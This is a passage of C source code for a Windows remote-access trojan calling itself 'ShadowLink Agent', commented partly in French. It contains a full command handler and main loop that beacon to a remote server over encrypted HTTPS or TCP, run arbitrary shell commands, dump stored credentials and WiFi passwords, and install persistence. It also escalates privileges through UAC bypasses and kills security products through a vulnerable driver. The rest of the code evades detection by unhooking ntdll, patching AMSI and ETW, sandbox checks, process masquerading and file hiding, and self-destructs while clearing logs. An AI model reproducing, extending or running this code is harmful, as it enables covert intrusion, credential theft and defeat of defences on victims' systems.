                "  FILE TRANSFER:\n"
                "    download <path> - Download file from agent\n"
                "    upload <path>   - Upload file to agent\n"
                "\n"
                "  RECONNAISSANCE:\n"
                "    recon          - Full system recon\n"
                "\n"
                "  PERSISTENCE:\n"
                "    persist        - Install persistence\n"
                "    unpersist      - Remove persistence\n"
                "    checkpersist   - Check persistence\n"
                "\n"
                "  EVASION (Phase 7):\n"
                "    stealth on/off - Toggle evasion\n"
                "    checksec       - Security checks\n"
                "    selfdestruct   - Delete from disk\n"
                "\n"
                "  ANTI-EDR (Phase 8):\n"
                "    antiedr        - Apply all anti-EDR\n"
                "      > Unhook ntdll.dll\n"
                "      > Init direct syscalls\n"
                "      > Bypass AMSI\n"
                "      > Patch ETW\n"
                "\n"
                "  PRIVILEGE ESCALATION:\n"
                "    isadmin        - Check current privs\n"
                "    privesc        - Enum privesc vectors\n"
                "    privesc services - Unquoted paths\n"
                "    privesc dll    - DLL hijack check\n"
                "    privesc msi    - MSI elevation check\n"
                "    elevate <method> - UAC bypass\n"
                "      > fodhelper, eventvwr, computerdef\n"
                "\n"
                "  BYOVD (Phase 10) [Requires Admin]:\n"
                "    byovd          - Show BYOVD help\n"
                "    byovd load <path> - Load vuln driver\n"
                "    byovd targets  - List EDR/AV procs\n"
                "    byovd kill <pid> - Kernel kill\n"
                "    byovd unload   - Unload driver\n"
                "\n"
                "  CREDENTIALS (Phase 9a):\n"
                "    creds          - Dump all credentials\n"
                "    wifi           - Dump WiFi passwords\n"
                "    browsers       - Check browser creds\n"
                "\n"
                "  INJECTION (Phase 9b):\n"
                "    targets        - List injection targets\n"
                "    inject <pid>   - Inject into PID\n"
                "    migrate <name> - Inject into process\n"
                "\n"
                "  STEALTH:\n"
                "    hide           - Hide agent file\n"
                "    unhide         - Show agent file\n"
                "    install        - Copy to hidden location\n"
                "    whereis        - Show current location\n"
                "\n"
                "  CONTROL:\n"
                "    help           - Show this help\n"
                "    exit           - Disconnect (reconnects)\n"
                "    die            - Kill permanently\n"
                "    selfdestruct   - Delete from disk\n"
                "    <cmd>          - Execute shell command\n"
                "========================================\n";
            uint8_t encryptedHelp[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)helpMsg, strlen(helpMsg), encryptedHelp);
            send(sock, (char*)encryptedHelp, encrypted_len, 0);
            continue;
        }
        
        // Commande STEALTH ON/OFF
        if (strcmp((char*)decryptedCommand, "stealth on") == 0) {
            stealth_mode = 1;
            const char *msg = "[+] Stealth mode ENABLED\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        if (strcmp((char*)decryptedCommand, "stealth off") == 0) {
            stealth_mode = 0;
            const char *msg = "[+] Stealth mode DISABLED\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande CHECKSEC - Vérifier la sécurité manuellement
        if (strcmp((char*)decryptedCommand, "checksec") == 0) {
            char msg[2048];
            int debugged = check_debugger_present();
            int timing = check_timing_attack();
            int vm_name = check_suspicious_computername();
            int vm_user = check_suspicious_username();
            int vm_res = check_low_resources();
            int vm_proc = check_vm_processes();
            int fast_exec = detect_fast_execution();
            
            // Check if key functions are hooked
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            void *pNtAlloc = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
            void *pNtProtect = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
            int ntalloc_hooked = is_function_hooked(pNtAlloc);
            int ntprotect_hooked = is_function_hooked(pNtProtect);
            
            snprintf(msg, sizeof(msg),
                "========================================\n"
                "   SECURITY CHECK RESULTS (Phase 8)\n"
                "========================================\n"
                "  Stealth Mode:       %s\n"
                "  Anti-EDR Applied:   %s\n"
                "  -------- ANTI-DEBUG --------\n"
                "  Debugger Present:   %s\n"
                "  Timing Attack:      %s\n"
                "  -------- ANTI-VM -----------\n"
                "  Suspicious PC:      %s\n"
                "  Suspicious User:    %s\n"
                "  Low Resources:      %s\n"
                "  VM Processes:       %s\n"
                "  -------- ANTI-SANDBOX ------\n"
                "  Fast Execution:     %s\n"
                "  -------- ANTI-EDR ----------\n"
                "  NtAllocateVM Hook:  %s\n"
                "  NtProtectVM Hook:   %s\n"
                "  Syscall Table:      %s\n"
                "  -------- ADVANCED -----------\n"
                "  XOR Encryption:     ACTIVE\n"
                "  API Hashing:        ACTIVE\n"
                "  Self-Delete Ready:  YES\n"
                "========================================\n"
                "  VERDICT: %s\n"
                "========================================\n",
                stealth_mode ? "ENABLED" : "DISABLED",
                anti_edr_applied ? "YES" : "NO",
                debugged ? "DETECTED!" : "OK",
                timing ? "DETECTED!" : "OK",
                vm_name ? "DETECTED!" : "OK",
                vm_user ? "DETECTED!" : "OK",
                vm_res ? "DETECTED!" : "OK",
                vm_proc ? "DETECTED!" : "OK",
                fast_exec ? "DETECTED!" : "OK",
                ntalloc_hooked ? "HOOKED!" : "CLEAN",
                ntprotect_hooked ? "HOOKED!" : "CLEAN",
                (g_SyscallTable.NtAllocateVirtualMemory > 0) ? "LOADED" : "NOT LOADED",
                (debugged || timing || vm_name || vm_user || vm_res || vm_proc || fast_exec) ? 
                    "UNSAFE ENVIRONMENT" : "SAFE");
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande ANTIEDR - Appliquer toutes les techniques anti-EDR
        if (strcmp((char*)decryptedCommand, "antiedr") == 0) {
            char msg[1024];
            int result = apply_anti_edr();
            
            if (result == 0) {
                snprintf(msg, sizeof(msg),
                    "========================================\n"
                    "   ANTI-EDR TECHNIQUES APPLIED\n"
                    "========================================\n"
                    "  [+] Unhooking ntdll.dll     SUCCESS\n"
                    "  [+] Syscall Table Init      SUCCESS\n"
                    "  [+] AMSI Bypass             SUCCESS\n"
                    "  [+] ETW Patching            SUCCESS\n"
                    "========================================\n"
                    "  All EDR bypass active!\n"
                    "========================================\n");
            } else {
                snprintf(msg, sizeof(msg),
                    "========================================\n"
                    "   ANTI-EDR TECHNIQUES APPLIED\n"
                    "========================================\n"
                    "  [%c] Unhooking ntdll.dll     %s\n"
                    "  [%c] Syscall Table Init      %s\n"
                    "  [%c] AMSI Bypass             %s\n"
                    "  [%c] ETW Patching            %s\n"
                    "========================================\n"
                    "  Partial success (code: 0x%02X)\n"
                    "========================================\n",
                    (result & 0x01) ? '!' : '+', (result & 0x01) ? "FAILED" : "SUCCESS",
                    (result & 0x02) ? '!' : '+', (result & 0x02) ? "FAILED" : "SUCCESS",
                    (result & 0x04) ? '!' : '+', (result & 0x04) ? "FAILED" : "SUCCESS",
                    (result & 0x08) ? '!' : '+', (result & 0x08) ? "FAILED" : "SUCCESS",
                    result);
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // ============================================
        // PRIVILEGE ESCALATION COMMANDS
        // ============================================
        
        // Commande PRIVESC - Enumeration et exploitation
        if (strncmp((char*)decryptedCommand, "privesc", 7) == 0) {
            char resultBuffer[8192];
            const char *args = (strlen((char*)decryptedCommand) > 8) ? 
                (char*)decryptedCommand + 8 : "";
            
            privesc_command(args, resultBuffer, sizeof(resultBuffer));
            
            uint8_t *encrypted = (uint8_t*)malloc(BUFFER_SIZE * 2);
            if (encrypted) {
                size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
                send(sock, (char*)encrypted, encrypted_len, 0);
                free(encrypted);
            }
            continue;
        }
        
        // Commande ELEVATE - UAC Bypass
        if (strncmp((char*)decryptedCommand, "elevate", 7) == 0) {
            char resultBuffer[2048];
            const char *method = (strlen((char*)decryptedCommand) > 8) ? 
                (char*)decryptedCommand + 8 : "";
            
            int result = elevate_command(method, resultBuffer, sizeof(resultBuffer));
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            // If elevation succeeded, this instance will be replaced by elevated one
            // The elevated instance will connect as a new session
            continue;
        }
        
        // Commande GETADMIN / ISADMIN - Check admin status
        if (strcmp((char*)decryptedCommand, "isadmin") == 0 || 
            strcmp((char*)decryptedCommand, "whoami /priv") == 0 ||
            strcmp((char*)decryptedCommand, "getadmin") == 0) {
            char msg[512];
            char level[32];
            int admin = is_admin();
            get_integrity_level(level, sizeof(level));
            
            snprintf(msg, sizeof(msg),
                "╔══════════════════════════════════════╗\n"
                "║     CURRENT PRIVILEGES               ║\n"
                "╠══════════════════════════════════════╣\n"
                "║ Administrator: %-21s ║\n"
                "║ Integrity:     %-21s ║\n"
                "║ Username:      %-21s ║\n"
                "╚══════════════════════════════════════╝\n",
                admin ? "YES ✓" : "NO ✗",
                level,
                getenv("USERNAME") ? getenv("USERNAME") : "Unknown");
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande BYOVD - Bring Your Own Vulnerable Driver
        if (strncmp((char*)decryptedCommand, "byovd", 5) == 0) {
            char resultBuffer[4096];
            const char *args = (strlen((char*)decryptedCommand) > 6) ? 
                (char*)decryptedCommand + 6 : "";
            
            byovd_command(args, resultBuffer, sizeof(resultBuffer));
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // ============================================
        // FILE HIDING COMMANDS
        // ============================================
        
        // Commande HIDE - Cacher l'exécutable
        if (strcmp((char*)decryptedCommand, "hide") == 0) {
            int result = hide_executable();
            const char *msg;
            if (result == 0) {
                msg = "[+] Agent executable is now HIDDEN\n"
                      "    Attributes: Hidden + System\n"
                      "    Won't appear in Explorer (unless show hidden files)\n";
            } else {
                msg = "[!] Failed to hide executable\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande UNHIDE - Montrer l'exécutable
        if (strcmp((char*)decryptedCommand, "unhide") == 0) {
            int result = unhide_executable();
            const char *msg;
            if (result == 0) {
                msg = "[+] Agent executable is now VISIBLE\n";
            } else {
                msg = "[!] Failed to unhide executable\n";
            }
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande INSTALL - Installer l'agent dans un emplacement discret
        if (strcmp((char*)decryptedCommand, "install") == 0) {
            char resultBuffer[2048];
            int new_pid = install_stealth(resultBuffer, sizeof(resultBuffer));
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)resultBuffer, strlen(resultBuffer), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            // If installation successful and new instance launched, terminate ourselves
            if (new_pid > 1) {
                Sleep(500);  // Give time for response to send
                closesocket(sock);
                WSACleanup();
                
                // Delete original file after delay (optional)
                // self_delete();  // Uncomment to auto-delete original
                
                ExitProcess(0);  // Clean exit - new agent takes over
            }
            continue;
        }
        
        // Commande WHEREIS - Afficher l'emplacement actuel
        if (strcmp((char*)decryptedCommand, "whereis") == 0) {
            char exePath[MAX_PATH];
            char msg[MAX_PATH + 100];
            
            if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
                DWORD attrs = GetFileAttributesA(exePath);
                const char *hidden_status = (attrs & FILE_ATTRIBUTE_HIDDEN) ? "HIDDEN" : "VISIBLE";
                const char *system_status = (attrs & FILE_ATTRIBUTE_SYSTEM) ? "+SYSTEM" : "";
                
                snprintf(msg, sizeof(msg), 
                    "[*] Agent location:\n"
                    "    Path: %s\n"
                    "    Status: %s%s\n"
                    "    PID: %lu\n",
                    exePath, hidden_status, system_status, GetCurrentProcessId());
            } else {
                snprintf(msg, sizeof(msg), "[!] Cannot determine location\n");
            }
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande SELFDESTRUCT - Supprimer l'agent du disque et terminer
        if (strcmp((char*)decryptedCommand, "selfdestruct") == 0) {
            const char *msg = 
                "╔══════════════════════════════════════╗\n"
                "║   ☠️  SELF-DESTRUCT INITIATED  ☠️     ║\n"
                "╠══════════════════════════════════════╣\n"
                "║ [1] Removing persistence...          ║\n"
                "║ [2] Purging registry entries...      ║\n"
                "║ [3] Deleting installed copies...     ║\n"
                "║ [4] Clearing event logs...           ║\n"
                "║ [5] Wiping recent traces...          ║\n"
                "║ [6] Secure file deletion...          ║\n"
                "╠══════════════════════════════════════╣\n"
                "║ Agent will be completely erased.     ║\n"
                "║ Goodbye.                             ║\n"
                "╚══════════════════════════════════════╝\n";
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            Sleep(100);  // Ensure message is sent
            closesocket(sock);
            WSACleanup();
            
            // Execute complete self-destruction
            self_destruct_complete();
            
            // Terminate immediately
            ExitProcess(0);
        }

        // Commande shell classique
        char outputBuffer[BUFFER_SIZE];
        if (execute_command((char*)decryptedCommand, outputBuffer, sizeof(outputBuffer)) == 0) {
            uint8_t encryptedOutput[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)outputBuffer, strlen(outputBuffer), encryptedOutput);
            send(sock, (char*)encryptedOutput, encrypted_len, 0);
        } else {
            const char *errorMsg = "Failed to execute command\n";
            uint8_t encryptedError[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
            send(sock, (char*)encryptedError, encrypted_len, 0);
        }
    }
}


// ============================================
// PHASE 11: ADVANCED STEALTH INTEGRATION
// ============================================

// Global HTTPS context
static HTTPS_CONNECTION g_HttpsContext = {0};

// Global Sleep configuration
static SLEEP_CONFIG g_SleepConfig = {0};

// Initialize all Phase 11 stealth modules
int phase11_init(void) {
    printf("[*] Phase 11: Initializing advanced stealth modules...\n");
    
    // 1. Initialize Hell's Gate syscall table
    if (!InitializeSyscallsHellsGate()) {
        printf("[!] Warning: Hell's Gate syscall init failed, using fallback\n");
    } else {
        printf("[+] Hell's Gate syscalls initialized\n");
    }
    
    // 2. Initialize sleep obfuscation
    g_SleepConfig.method = SLEEP_METHOD_EKKO;
    g_SleepConfig.dwKeySize = 32;
    generate_random_key(g_SleepConfig.key, 32);
    printf("[+] Sleep obfuscation configured (Ekko technique)\n");
    
    // 3. HTTPS transport will be initialized per-connection
    printf("[+] HTTPS transport ready\n");
    
    return 1;
}

// Process a command received via HTTPS (similar to command_loop but non-blocking)
int process_https_command(const char* command, char* response, size_t response_size) {
    if (!command || !response || response_size == 0) return -1;
    
    response[0] = '\0';
    
    // EXIT command - return special code
    if (strcmp(command, "exit") == 0) {
        snprintf(response, response_size, "[*] Session disconnected\n");
        return 1;  // Signal to disconnect
    }
    
    // DIE command
    if (strcmp(command, "die") == 0) {
        snprintf(response, response_size, "[*] Agent terminating...\n");
        return 2;  // Signal to die
    }
    
    // PS command
    if (strcmp(command, "ps") == 0) {
        list_processes(response, response_size);
        return 0;
    }
    
    // RECON command
    if (strcmp(command, "recon") == 0) {
        do_recon(response, response_size);
        return 0;
    }
    
    // CREDS command
    if (strcmp(command, "creds") == 0) {
        dump_all_credentials(response, response_size);
        return 0;
    }
    
    // PERSIST command
    if (strcmp(command, "persist") == 0) {
        if (install_persistence() == 0) {
            snprintf(response, response_size, "[+] Persistence installed\n");
        } else {
            snprintf(response, response_size, "[!] Persistence failed\n");
        }
        return 0;
    }
    
    // CHECKPERSIST command
    if (strcmp(command, "checkpersist") == 0) {
        if (check_persistence()) {
            snprintf(response, response_size, "[+] Persistence ACTIVE\n");
        } else {
            snprintf(response, response_size, "[-] Persistence not installed\n");
        }
        return 0;
    }
    
    // KILL <pid> command
    if (strncmp(command, "kill ", 5) == 0) {
        DWORD pid = (DWORD)atoi(command + 5);
        int result = kill_process(pid);
        if (result == 0) {
            snprintf(response, response_size, "[+] Process %lu terminated\n", pid);
        } else {
            snprintf(response, response_size, "[!] Failed to kill process %lu\n", pid);
        }
        return 0;
    }
    
    // SLEEP <ms> command - change beacon interval
    if (strncmp(command, "sleep ", 6) == 0) {
        int interval = atoi(command + 6);
        if (interval >= 1000) {
            snprintf(response, response_size, "[+] Beacon interval set to %d ms\n", interval);
            // Return interval in high bits of response code
            return (interval << 8) | 3;  // 3 = change sleep
        } else {
            snprintf(response, response_size, "[!] Interval too short (min 1000ms)\n");
        }
        return 0;
    }
    
    // Shell command execution
    if (execute_command(command, response, response_size) != 0) {
        snprintf(response, response_size, "[!] Command execution failed\n");
    }
    
    return 0;
}

// Main loop using HTTPS transport with sleep obfuscation
int agent_main_loop_https(void) {
    char *server_ip = get_decrypted_server_ip();
    int beacon_interval = DEFAULT_BEACON_INTERVAL;
    
    // Convert server IP to wide string
    wchar_t wserver_ip[64];
    mbstowcs(wserver_ip, server_ip, 64);
    
    printf("[*] Starting HTTPS beacon loop to %s:%d\n", server_ip, HTTPS_PORT);
    
    // Initialize HTTPS context
    if (!https_init(&g_HttpsContext, wserver_ip, HTTPS_PORT)) {
        printf("[!] HTTPS init failed, falling back to TCP\n");
        return -1;  // Fall back to TCP
    }
    
    printf("[+] HTTPS transport initialized\n");
    
    while (1) {
        // Evasion checks
        if (perform_evasion_checks()) {
            https_close(&g_HttpsContext);
            evasion_exit();
        }
        
        // Beacon to server
        char command[BUFFER_SIZE] = {0};
        if (https_beacon(&g_HttpsContext, command, sizeof(command))) {
            
            if (strlen(command) > 0 && strcmp(command, "NOP") != 0) {
                printf("[*] Received command: %s\n", command);
                
                // Process the command
                char *response = (char*)malloc(RECON_BUFFER_SIZE);
                if (response) {
                    int result = process_https_command(command, response, RECON_BUFFER_SIZE);
                    
                    // Send response back
                    if (strlen(response) > 0) {
                        https_send_response(&g_HttpsContext, response);
                    }
                    
                    free(response);
                    
                    // Handle special return codes
                    if (result == 1) {
                        // Exit - disconnect but continue beaconing
                        continue;
                    } else if (result == 2) {
                        // Die
                        https_close(&g_HttpsContext);
                        ExitProcess(0);
                    } else if ((result & 0xFF) == 3) {
                        // Change beacon interval
                        beacon_interval = result >> 8;
                        printf("[*] Beacon interval changed to %d ms\n", beacon_interval);
                    }
                }
            }
        }
        
        // Sleep with obfuscation (encrypt memory during sleep)
        #ifdef SLEEP_OBFUSCATION_ENABLED
            printf("[*] Sleeping %d ms (obfuscated)...\\n", beacon_interval);
            obfuscated_sleep(beacon_interval);
        #else
            Sleep(beacon_interval);
        #endif
    }
    
    https_close(&g_HttpsContext);
    return 0;
}


int main() {
    // ============================================
    // PROCESS MASQUERADING - HIDE IN TASK MANAGER
    // ============================================
    // Apply immediately before any other operation
    apply_process_masquerade();
    
    // Seed pour rand()
    srand((unsigned int)time(NULL));
    
    // ============================================
    // ADVANCED EVASION - DELAYED EXECUTION
    // ============================================
    // Attendre avant de faire quoi que ce soit
    // Les sandbox ont souvent un timeout court
    if (stealth_mode) {
        // Vérifier si le temps est accéléré (sandbox)
        if (delayed_execution(INITIAL_DELAY)) {
            // Sandbox détectée - sortie silencieuse
            evasion_exit();
        }
    }
    
    // ============================================
    // EVASION CHECKS AU DÉMARRAGE
    // ============================================
    if (perform_evasion_checks()) {
        // Environnement suspect détecté - sortie silencieuse
        evasion_exit();
    }
    
    // ============================================
    // PHASE 8: APPLY ANTI-EDR AT STARTUP
    // ============================================
    if (stealth_mode) {
        apply_anti_edr();
    }
    
    // ============================================
    // PHASE 11: INITIALIZE STEALTH MODULES
    // ============================================
    phase11_init();
    
    printf("[*] ShadowLink Agent - Phase 11 (Advanced Stealth)\n");

    WSADATA wsaData; 
    int result = WSAStartup(MAKEWORD(2,2), &wsaData);

    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    
    printf("[+] Winsock initialized\n");
    
    // ============================================
    // TRANSPORT SELECTION: HTTPS (default) or TCP (fallback)
    // ============================================
    #if USE_HTTPS_TRANSPORT
    printf("[*] Using HTTPS transport (Phase 11)\n");
    
    // Try HTTPS first
    int https_result = agent_main_loop_https();
    
    if (https_result == -1) {
        printf("[!] HTTPS failed, falling back to legacy TCP...\n");
        // Fall through to TCP below
    } else {
        // HTTPS loop ended normally
        WSACleanup();
        return 0;
    }
    #endif
    
    // ============================================
    // LEGACY TCP TRANSPORT (fallback)
    // ============================================
    printf("[*] Using legacy TCP transport\n");
    
    int reconnect_delay = RECONNECT_DELAY;
    
    // Boucle de reconnexion infinie
    while (1) {
        // Vérification périodique de l'environnement
        if (perform_evasion_checks()) {
            evasion_exit();
        }
        
        char *server_ip = get_decrypted_server_ip();
        printf("[*] Attempting to connect to %s:%d...\n", server_ip, SERVER_PORT);
        
        SOCKET sock = connect_to_server();
        
        if (sock == INVALID_SOCKET) {
            printf("[-] Connection failed, retrying in %d seconds...\n", reconnect_delay / 1000);
            Sleep(reconnect_delay);
            
            // Backoff exponentiel (double le délai jusqu'au max)
            if (reconnect_delay < MAX_RECONNECT_DELAY) {
                reconnect_delay *= 2;
                if (reconnect_delay > MAX_RECONNECT_DELAY) {
                    reconnect_delay = MAX_RECONNECT_DELAY;
                }
            }
            continue;
        }
        
        // Connexion réussie, reset le délai
        reconnect_delay = RECONNECT_DELAY;
        printf("[+] Connected to server at %s:%d\n", server_ip, SERVER_PORT);
        
        // Boucle de commandes
        command_loop(sock);
        
        // Déconnecté, fermer le socket et réessayer
        closesocket(sock);
        printf("[*] Disconnected, reconnecting in %d seconds...\n", RECONNECT_DELAY / 1000);
        Sleep(RECONNECT_DELAY);
    }

    WSACleanup();
    printf("[*] Agent terminated\n");

    return 0;
}
